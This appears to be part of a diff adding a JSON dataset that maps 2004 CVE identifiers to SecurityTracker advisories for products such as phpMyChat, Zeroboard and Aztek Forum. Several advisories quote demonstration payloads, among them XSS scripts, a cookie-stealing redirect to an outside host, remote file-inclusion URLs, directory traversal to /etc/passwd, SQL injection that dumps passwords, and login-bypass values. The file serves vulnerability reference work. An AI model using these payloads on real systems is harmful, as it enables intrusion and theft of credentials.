+        "body": "Manuel Lopez reported several vulnerabilities in NewsPHP. A remote user can gain administrative access on the application. A remote authenticated administrator can upload arbitrary files. Cross-site scripting attacks are also possible.It is reported that the software does not properly validate user-supplied cookies to authenticate administrative users. A remote user can reportedly supply the following cookie to gain administrative access:autorized=admin; root=adminA demonstration exploit script is provided in the Source Message.It is also reported that a remote authenticated administrator (or a remote user that has exploited the above described authentication vulnerability) can invoke the File Upload feature to upload arbitrary files instead of video files. The remote user can then load a URL to cause the uploaded file to be executed by the web server with the privileges of the web server.It is also reported that the software does not properly filter HTML code from user-supplied input in the 'cat_id' parameter. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the NewsPHP software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. A demonstration exploit URL is provided:/index.php?cat_id=[XSS]The vendor was reportedly notified on April 3, 2004.",
+        "extra": "A remote user can gain administrative access on the application.A remote authenticated administrator can upload arbitrary files to the target system and execute them with the privileges of the web server.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the NewsPHP software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2702": [
+      {
+        "url": "http://securitytracker.com/id?1011042",
+        "title": "Plesk 7 Reloaded Input Validation Flaw in 'login_up.php3' Permits Cross-Site Scripting Attacks",
+        "body": "A vulnerability was reported in Plesk 7 Reloaded. A remote user can conduct cross-site scripting attacks.Sourvivor reported that the 'login_up.php3' script does not properly filter HTML code from user-supplied input in the 'login_name' variable before displaying that information. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Plesk 7 Reloaded software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A demonstration exploit URL is provided:http://[target]/login_up.php3?login_name=\"><script>alert(document.cookie)</script><\"&passwd=TheSur",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Plese 7 Reloaded software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2704": [
+      {
+        "url": "http://securitytracker.com/id?1011054",
+        "title": "Hastymail May Execute Scripting Code in E-Mail Content When 'Download' is Selected",
+        "body": "A vulnerability was reported in the Hastymail IMAP client. A remote user can send a malicious message to cause scripting code to be executed on the target user's computer.The vendor reported that when a user invokes the 'download' link, Internet Explorer will launch and attempt to display attachments inline. As a result, scripting code in a message may be executed when the target user attempts to download the content.The vendor credits Manish Raje with reporting this issue.",
+        "extra": "The client may execute scripting code within a MIME attachment when download is selected.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2715": [
+      {
+        "url": "http://securitytracker.com/id?1010515",
+        "title": "phpMyChat Grants Administrative Access to Remote Users and Has Other Flaws",
+        "body": "Several vulnerabilities were reported in phpMyChat. A remote user can gain administrative access to the application. A remote user can also inject SQL commands and conduct cross-site scripting attacks. A remote authenticated administrator can view files on the target system.HEX reported that 'lib/login.lib.php3' and 'admin/adminBody.php3' contain several flaws.It is reported that a remote user can send a specially crafted HTML form value (do_not_login=\"false\") to the 'chat/edituser.php3' to gain administrative access to the system.It is also reported that a remote authenticated administrator (or a remote user that has exploited the above listed flaw) can view files and directories on the target system. The remote authenticated administrator can supply a specially crafted filename for the 'sheet' variable in 'admin.php3'. Some demonstration exploit URLs are provided: http://[TARGET]/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=[FILE]%00 http://[TARGET]/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sheet=/../../../../../../etc/ http://[TARGET]/chat/admin.php3?From=admin.php3&What=[FILE]%00&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=1 http://[TARGET]/chat/admin.php3?From=admin.php3&What=/../../../../../../etc/passwd%00&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sIt is also reported that the 'input.php3' script does not properly validate user-supplied input in the 'C' variable. A remote user can create specially crafted input that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the phpMyChat software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.It is also reported that a remote user can also inject SQL commands via the 'usersL.php3' script because many variables are not properly validated, including $sortBy, $sortOrder, $startReg, $U, $LastCheck, and others. Some demonstration exploit URLs are provided:http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20username,null,null,null%20FROM%20%20c_reg_users%20/* http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20password,null,null,null%20FROM%20%20c_reg_users%20/* http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20email,null,null,null%20FROM%20%20c_reg_users%20/*",
+        "extra": "A remote user can gain administrative access to the application.A remote user can inject SQL commands.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the phpMyChat software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote authenticated administrator can view arbitrary files on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2716": [
+      {
+        "url": "http://securitytracker.com/id?1010515",
+        "title": "phpMyChat Grants Administrative Access to Remote Users and Has Other Flaws",
+        "body": "Several vulnerabilities were reported in phpMyChat. A remote user can gain administrative access to the application. A remote user can also inject SQL commands and conduct cross-site scripting attacks. A remote authenticated administrator can view files on the target system.HEX reported that 'lib/login.lib.php3' and 'admin/adminBody.php3' contain several flaws.It is reported that a remote user can send a specially crafted HTML form value (do_not_login=\"false\") to the 'chat/edituser.php3' to gain administrative access to the system.It is also reported that a remote authenticated administrator (or a remote user that has exploited the above listed flaw) can view files and directories on the target system. The remote authenticated administrator can supply a specially crafted filename for the 'sheet' variable in 'admin.php3'. Some demonstration exploit URLs are provided: http://[TARGET]/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=[FILE]%00 http://[TARGET]/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sheet=/../../../../../../etc/ http://[TARGET]/chat/admin.php3?From=admin.php3&What=[FILE]%00&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=1 http://[TARGET]/chat/admin.php3?From=admin.php3&What=/../../../../../../etc/passwd%00&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sIt is also reported that the 'input.php3' script does not properly validate user-supplied input in the 'C' variable. A remote user can create specially crafted input that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the phpMyChat software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.It is also reported that a remote user can also inject SQL commands via the 'usersL.php3' script because many variables are not properly validated, including $sortBy, $sortOrder, $startReg, $U, $LastCheck, and others. Some demonstration exploit URLs are provided:http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20username,null,null,null%20FROM%20%20c_reg_users%20/* http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20password,null,null,null%20FROM%20%20c_reg_users%20/* http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20email,null,null,null%20FROM%20%20c_reg_users%20/*",
+        "extra": "A remote user can gain administrative access to the application.A remote user can inject SQL commands.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the phpMyChat software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote authenticated administrator can view arbitrary files on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2717": [
+      {
+        "url": "http://securitytracker.com/id?1010515",
+        "title": "phpMyChat Grants Administrative Access to Remote Users and Has Other Flaws",
+        "body": "Several vulnerabilities were reported in phpMyChat. A remote user can gain administrative access to the application. A remote user can also inject SQL commands and conduct cross-site scripting attacks. A remote authenticated administrator can view files on the target system.HEX reported that 'lib/login.lib.php3' and 'admin/adminBody.php3' contain several flaws.It is reported that a remote user can send a specially crafted HTML form value (do_not_login=\"false\") to the 'chat/edituser.php3' to gain administrative access to the system.It is also reported that a remote authenticated administrator (or a remote user that has exploited the above listed flaw) can view files and directories on the target system. The remote authenticated administrator can supply a specially crafted filename for the 'sheet' variable in 'admin.php3'. Some demonstration exploit URLs are provided: http://[TARGET]/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=[FILE]%00 http://[TARGET]/chat/admin.php3?From=admin.php3&What=Body&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sheet=/../../../../../../etc/ http://[TARGET]/chat/admin.php3?From=admin.php3&What=[FILE]%00&L=russian&user=[USER]&pswd=[YOU HASH PASSWORD]&sheet=1 http://[TARGET]/chat/admin.php3?From=admin.php3&What=/../../../../../../etc/passwd%00&L=russian&user=admin&pswd=[YOU HASH PASSWORD]&sIt is also reported that the 'input.php3' script does not properly validate user-supplied input in the 'C' variable. A remote user can create specially crafted input that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the phpMyChat software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.It is also reported that a remote user can also inject SQL commands via the 'usersL.php3' script because many variables are not properly validated, including $sortBy, $sortOrder, $startReg, $U, $LastCheck, and others. Some demonstration exploit URLs are provided:http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20username,null,null,null%20FROM%20%20c_reg_users%20/* http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20password,null,null,null%20FROM%20%20c_reg_users%20/* http://[TARGET]/chat/usersL.php3?L=russian&R='%20UNION%20SELECT%20email,null,null,null%20FROM%20%20c_reg_users%20/*",
+        "extra": "A remote user can gain administrative access to the application.A remote user can inject SQL commands.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the phpMyChat software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote authenticated administrator can view arbitrary files on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2720": [
+      {
+        "url": "http://securitytracker.com/id?1010524",
+        "title": "Snitz Forums 2000 Input Validation Flaw in 'register.asp' Lets Remote Users Conduct Cross-Site Scripting Attacks",
+        "body": "An input validation vulnerability was reported in Snitz Forums 2000. A remote user can conduct cross-site scripting attacks.Pete Foster of Sec-Tec reported that 'register.asp' script does not properly filter the e-mail address field to remove HTML code.A remote user can submit a specially crafted e-mail address value during registration. Then, when a target user attempts to click on a link to send e-mail to the newly registered user, arbitrary scripting code will be executed by the target user's browser. The code will originate from the site running the Snitz Forums software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. A demonstration exploit value is provided:p@p\" onMouseOver=\"alert(document.cookie);The vendor was reportedly notified on May 6, 2004.The original advisory is available at:http://www.sec-tec.co.uk/vulnerability/snitzxss.html",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Snitz Forums software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2721": [
+      {
+        "url": "http://securitytracker.com/id?1012181",
+        "title": "OpenSkat VTMF CheckGroup() Randomization Error May Let Remote Users Determine Private Keys",
+        "body": "A vulnerability was reported in the OpenSkat game in the VTMF implementation. The system may create weak keys.The vendor reported a typographical error in the CheckGroup() function in the VTMF implementation (BarnettSmartVTMF_dlog::CheckGroup). The software does not properly check to make sure the 'p' variable is probably prime. The resulting public key generated using the potentially non-prime 'p' variable may be cryptographically weak, potentially allowing a remote user to factor the pq modulus and determine the private key.",
+        "extra": "A remote user may be able to more readily determine keys used in the game.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2724": [
+      {
+        "url": "http://securitytracker.com/id?1011080",
+        "title": "Chat Anywhere Can Be Crashed By Remote Users With Specially Crafted Username",
+        "body": "Donato Ferrante reported a vulnerability in Chat Anywhere. A remote user can cause the chat service to crash.It is reported that the server does not properly manage fake user accounts. A remote user can connect to the service and supply a specially crafted username beginning with a '%' character and followed by a null character and arbitrary characters. This will cause the chat service to crash and cause the connected clients to consume CPU resources.Some demonstration exploits are available at:http://www.autistici.org/fdonato/poc/ChatAnywhere[272a]DoS-poc.ziphttp://aluigi.altervista.org/poc/chatanydos.zipThe vendor was originally notified on December 4, 2003 by Luigi Auriemma.",
+        "extra": "A remote user can cause the target chat service to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2725": [
+      {
+        "url": "http://securitytracker.com/id?1012213",
+        "title": "Aztek Forum Input Validation Holes Lets Remote Users Conduct Cross-Site Scripting Attacks",
+        "body": "benjilenoob reported some input validation vulnerabilities in Aztek Forum. A remote user can conduct cross-site scripting attacks.It is reported that several scripts do not properly validate user-supplied input to remove HTML code before displaying information based on the user-supplied input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Aztek Forum software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.It is reported that 'forum_2.php' does not validate the 'return' and 'title' variables. A demonstration exploit URL is provided:http://[target]/forum%20aztek/forum_2.php?msg=10&return=')%3C/script%3E%3Cscript%3E%20%20document.location=%20'www.site.com/code_evil.php?cookie='%20+window.document.cookie;%20%20%3C/script%3EIt is also reported that 'search.php' does not validate search queries.It is also reported that 'subscribe.php' does not validate the 'email' variable.",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Aztek Forum software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2727": [
+      {
+        "url": "http://securitytracker.com/id?1010107",
+        "title": "MailEnable Buffer Overflow in HTTPMail Lets Remote Users Execute Arbitrary Code",
+        "body": "Hat-Squad Security Team reported a heap overflow vulnerability in MailEnable in the HTTPMail component. A remote user can execute arbitrary code on the target system.It is reported that a remote user can send a specially crafted HTTP request that contains more than 4045 bytes to the MEHTTPS service (on port 8080 by default) to trigger a buffer overflow. A remote user can cause the service to crash or execute arbitrary code with SYSTEM level privileges.The report indicats that the request must contain more than 8500 bytes to trigger the overflow when logging is disabled.Some demonstration exploit requests are provided:GET /<4032xA> HTTP/1.1 (while logging is enabled)GET /<8501xA> (logging is disabled)The vendor was reportedly notified on May 8, 2004.The report credits Behrang Fouladi with discovering the flaw and Pejman Davarzani with performing additional research.The original advisory is available at:http://www.hat-squad.com/en/000071.html",
+        "extra": "A remote user can cause the HTTPMail service to crash or execute arbitrary code with SYSTEM privileges.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2728": [
+      {
+        "url": "http://securitytracker.com/id?1011942",
+        "title": "Hummingbird Connectivity Lets Remote Authenticated Users Deny Service and Local Users Grab System Privileges",
+        "body": "Two vulnerabilties were reported in Hummingbird Connectivity. A remote authenticated user can cause the FTP service to crash. A local user can execute applications with Local System privileges.NISCC reported that a local user can invoke the Hummingbird Inetd32 administration tool and specify an arbitrary application to be executed when a particular service receives a connection. A local user can specify their own application and then generate a connection to the applicable service to cause the user's own application to be executed with Local System privileges.It is also reported that a remote authenticated user can issue a specially crafted XCWD command with a directory name of between 256 and 259 characters to trigger a buffer overflow and cause the FTP service to crash.The CESG Network Defence Team is credited with reporting these flaws.",
+        "extra": "A remote authenticated user can cause the FTP service to crash.A local user can execute applications with Local System privileges to gain elevated privileges on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2729": [
+      {
+        "url": "http://securitytracker.com/id?1011942",
+        "title": "Hummingbird Connectivity Lets Remote Authenticated Users Deny Service and Local Users Grab System Privileges",
+        "body": "Two vulnerabilties were reported in Hummingbird Connectivity. A remote authenticated user can cause the FTP service to crash. A local user can execute applications with Local System privileges.NISCC reported that a local user can invoke the Hummingbird Inetd32 administration tool and specify an arbitrary application to be executed when a particular service receives a connection. A local user can specify their own application and then generate a connection to the applicable service to cause the user's own application to be executed with Local System privileges.It is also reported that a remote authenticated user can issue a specially crafted XCWD command with a directory name of between 256 and 259 characters to trigger a buffer overflow and cause the FTP service to crash.The CESG Network Defence Team is credited with reporting these flaws.",
+        "extra": "A remote authenticated user can cause the FTP service to crash.A local user can execute applications with Local System privileges to gain elevated privileges on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2730": [
+      {
+        "url": "http://securitytracker.com/id?1010737",
+        "title": "Sysinternals PsTools Fails to Disconnect Share Access Allowing Local Users to Gain Administrative Access on Remote Systems",
+        "body": "Some vulnerabilities were reported in Sysinternals PsTools. A local user can gain administrative access on certain remote hosts.Computer Associates reported that several of the PsTools utilities map the IPC$ or ADMIN$ share when executing a command on a remote host but do not properly disconnect from the share when the utility exits. As a result, a local user can access the share and take administrative actions on the target system.The following utilities are affected:psexec 1.52, psgetsid 1.4, psinfo 1.5, pskill 1.03, pslist 1.25, psloglist 2.5, pspasswd 1.21, psservice 2.1, psshutdown 2.31, pssuspend 1.04.PsTools 2.01, 2.02, and 2.03 are also affected.Alan Ridgeway of Computer Associates is credited with discovering these flaws.",
+        "extra": "A local user can gain administrative access on remote hosts managed by PsTools in certain cases.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2731": [
+      {
+        "url": "http://securitytracker.com/id?1010617",
+        "title": "Linux Kernel SBus PROM Driver Integer Overflows Let Local Users Crash the System",
+        "body": "Several integer overflow vulnerabilities were reported in the Linux kernel in the SBus PROM driver. A local user can cause denial of service conditions.Sean reported that a local user can supply specially crafted values to overflow some integer variables, causing buffers to be allocated that are too small to copy the amount of user-supplied data.The report indicated that the source of the driver is generally located at:/usr/src/linux/drivers/sbus/char/openprom.cThe flaws reportedly reside in the copyin() and copyin_string() functions.The report states that it may be possible to execute arbitrary code, but that was not confirmed.The vendor was reportedly notified.",
+        "extra": "A local user can cause the system to crash.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2732": [
+      {
+        "url": "http://securitytracker.com/id?1011881",
+        "title": "Netbilling 'nbmember.cgi' Discloses System and User Information to Remote Users",
+        "body": "A vulnerability was reported in Netbilling's 'nbmember.cgi' script. A remote user can determine potentially sensitive system and user information.'ls' reported that a remote user can send the following command to obtain system information:http://[target]/cgi-bin/nbmember.cgi?cmd=testWith the information returned, a remote user can locate the 'members-service.pwd' password file and the 'nbmember.cfg' file that contains the site key.The 'nbmember.cfg' file can then be obtained and the access keyword can be read from the file.Knowing the access keyword, the remote user can request the following type of URL to obtain a list of all users on the target application:http://[target]/cgi-bin/nbmember.cgi?cmd=list_all_users&keyword=hereistheaccesskeyword",
+        "extra": "A remote user can determine information about the system configuration and about users on the target application.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2733": [
+      {
+        "url": "http://securitytracker.com/id?1010012",
+        "title": "Web Wiz Forums Input Validation Hole in 'pop_up_ip_blocking.asp' Lets Remote Users Inject SQL Commands",
+        "body": "Some vulnerabilities were reported in Web Wiz Forums. A remote user can inject SQL commands.Alexander (Pig Killer) reported that 'pop_up_ip_blocking.asp' does not properly validate user-supplied input in the 'chkDelete' parameter. As a result, a remote user can submit a specially crafted request to execute SQL queries on the underlying database. A remote user can, for example, access any user account and change passwords.It is also reported that a remote user can exploit 'pop_up_topic_admin.asp' to change various topic parameters, such as the name of the topic.It is also reported that a remote user can exploit 'pop_up_ip_blocking.asp' to block arbitrary IP addresses.",
+        "extra": "A remote user can inject SQL commands on the underlying database.A remote user can block arbitrary IP addresses.A remote user can modify Topic parameters.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2734": [
+      {
+        "url": "http://securitytracker.com/id?1011012",
+        "title": "Novell Web Manager May Grant Remote Users Access to the WEB-INF Folder",
+        "body": "A vulnerability was reported in Novell Web Manager. A remote user can gain access to the WEB-INF folder.Novell issued a Technical Information Document (TID10094233) warning of a potential security vulnerability in Novell Web Manager running on Novell NetWare 6.5.The alias directive in 'webadmin-apache.conf' uses upper case characters for the 'sys:' volume name while the directory directive uses lower case characters. As a result, the directory directive, which is designed to prevent access to the WEB-INF folder, does not properly prevent access when the alias is used.",
+        "extra": "A remote user may be able to gain access to the WEB-INF directory.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2735": [
+      {
+        "url": "http://securitytracker.com/id?1010078",
+        "title": "P4DB Input Validation Holes Let Remote Users Execute Arbitrary Shell Commands",
+        "body": "Some input validation vulnerabilities were reported in P4DB. A remote user can execute arbitrary shell commands on the target system. A remote user can also conduct cross-site scripting attacks.Jon McClintock reported that the software does not properly validate user-supplied input in a number of situations. As a result, a remote user can supply specially crafted data to execute arbitrary shell commands on the target system with the privileges of the target web service. In addition, it is reported that a remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the P4DB software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. The vendor was reportedly notified in March 2004 without response.",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the P4DB software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A remote user can execute arbitrary commands on the target system. The commands will run with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2738": [
+      {
+        "url": "http://securitytracker.com/id?1012677",
+        "title": "Zeroboard Input Validation Holes in out_login.php and write.php Let Remote Users Execute Arbitrary Commands",
+        "body": "STG Security reported several vulnerabilities in Zeroboard. A remote user can execute arbitrary commands on the target system. A remote user can also conduct cross-site scripting attacks.It is reported that the 'outlogin.php' script does not properly validate user-supplied input in the '_zb_path' variable if PHP is configured with register_globals set on. A remote user can supply a specially crafted value for the variable to cause the target application to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will execute with the privileges of the target web service.A demonstration exploit URL for PHP version 5 is provided:http://[target]/outlogin.php?_zb_path=ftp://[attacker]/pub/The 'dir' variable in 'write.php' is also affected. A demonstration exploit URL is provided:http://[target]/include/write.php?dir=http://[attacker]/It is also reported that 'check_user_id.php' does not filter HTML code from user-supplied input in the 'user_id' parameter. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Zeroboard software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user. A demonstration exploit URL is provided:http://[target]/check_user_id.php?user_id=<script>alert(document.cookie)</script>The vendor was notified on November 20, 2004.Jeremy Bae from STG Security is credited with discovering this flaw.",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Zeroboard software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2739": [
+      {
+        "url": "http://securitytracker.com/id?1012369",
+        "title": "PHProjekt 'setup.php' Lets Remote Users Upload Files and Execute Commands",
+        "body": "A vulnerability was reported in PHProjekt in the setup files. A remote user can modify the configuration and execute arbitrary scripts and commands on the target system.The vendor reported that a remote user can exploit 'setup.php' to upload and execute arbitrary PHP scripts, including operating system commands, with the privileges of the target web service.The vendor credits Martin Munch of 'it.sec' with reporting this flaw.",
+        "extra": "A remote user can execute arbitrary PHP scripts, including operating system commands, on the target system. The scripts will run with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2740": [
+      {
+        "url": "http://securitytracker.com/id?1012708",
+        "title": "PHProjekt 'authform.inc.php' Include File Flaw Lets Remote Users Execute Arbitrary Command",
+        "body": "Phil C. reported a vulnerability in PHProjekt in 'authform.inc.php'. A remote user can execute arbitrary commands on the target system.It is reported that a remote user can supply a specially crafted $path_pre variable to cause 'authform.inc.php' to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.",
+        "extra": "A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2741": [
+      {
+        "url": "http://securitytracker.com/id?1011959",
+        "title": "Horde Application Framework Input Validation Bug in Help Window Lets Remote Users Conduct Cross-Site Scripting",
+        "body": "An input validation vulnerability was reported in Horde Application Framework. A remote user may be able to conduct cross-site scripting attacks.The vendor reported that the help window does not properly validate user-supplied input. Certain variables are not properly URL-encoded.A remote user can cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Horde Application Framework software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Horde Application Framework software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2742": [
+      {
+        "url": "http://securitytracker.com/id?1012703",
+        "title": "Crystal Enterprise Filtering Flaw in RPT File URLs Permits Cross-Site Scripting Attacks",
+        "body": "A vulnerability was reported in Crystal Enterprise. A remote user can conduct cross-site scripting attacks.It is reported that the software does not properly validate user-supplied input in report (RPT) file URLs. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Crystal Enterprise software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "extra": "A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Crystal Enterprise software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2743": [
+      {
+        "url": "http://securitytracker.com/id?1011960",
+        "title": "Mega Upload Filenames in Querystring May Let Malicious Users Overwrite or Copy Files",
+        "body": "A security issue was reported in Mega Upload. A remote user may be able to cause files to be overwritten.The vendor reported that files to be uploaded are specified via the querystring. A remote user can create a specially crafted URL containing bogus pathnames that, when loaded, will cause files to be overwritten or copied.The vendor has issued a fixed version (1.45), available at:http://sourceforge.net/project/showfiles.php?group_id=87646",
+        "extra": "A malicious user may be able to copy or overwrite files on the target system.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2745": [
+      {
+        "url": "http://www.securitytracker.com/id?1008800",
+        "title": "Anteco OwnServer Input Validation Flaw Discloses Files to Remote Users",
+        "body": "An input validation vulnerability was reported in the Anteco OwnServer. A remote user can view files located anywhere on the system.Rafel Ivgi (The-Insider) reported that the server does not properly validate user-supplied requests. A remote user can request a URL containing '../' directory traversal characters to view arbitrary files on the target system with the privileges of the application.Some demonstration exploit URLs are provided:http://[target]/../../boot.inihttp://[target]/../../../boot.inihttp://[target]/../../../../boot.inihttp://[target]/../../../../../boot.inihttp://[target]/../../../../../../boot.ini",
+        "extra": "A remote user can view arbitrary files on the target system with the privileges of the application.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2746": [
+      {
+        "url": "http://securitytracker.com/id?1008745",
+        "title": "XTREME ASP Photo Gallery Input Input Validation Flaw Grants Administrative Access to Remote Users",
+        "body": "An input validation vulnerability was reported in XTREME ASP Photo Gallery. A remote user can inject SQL commands to gain administrative access to the application.Tripbit Security Research reported that the software does not properly filter user-supplied input in the 'username' and 'password' fields of the '/photoalbum/admin/adminlogin.asp' script. A remote user can supply the following values to gain administrative access to the application: Username: 'or' Password: 'or'The vendor has reportedly been notified.The original advisory is available at:http://www.tripbit.org/advisories/TA-150104.txt",
+        "extra": "A remote user can execute SQL commands to be executed by the underlying database. A remote user can gain administrative access to the application.",
+        "meta": {
+          "extraType": "impact"
+        }
+      }
+    ],
+    "CVE-2004-2747": [
+      {
+        "url": "http://www.securitytracker.com/id?1008756",
+        "title": "Pablo FTP Server Lets Remote Authenticated Users Determine File Existence",
+        "body": "Arnaud Jacques from securiteinfo.com reported a vulnerability in the FTP Server from Pablo Software Solutions. A remote authenticated user can determine if a specified file exists on the target server.It is reported that a remote authenticated user can invoke the DEL command (e.g., \"del ../WINNT/Q328310.log\") on an arbitrary file located outside of the FTP root directory to determine if the file exists or not. If the specified file exists, the server reportedly responds with:550 Permission denied.If the specified file does not exist, the server reportedly responds with:550 File not found.",
+        "extra": "A remote authenticated user, including an anonymous user, can determine whether a specified file located anywhere on the system exists on the target server.",
+        "meta": {
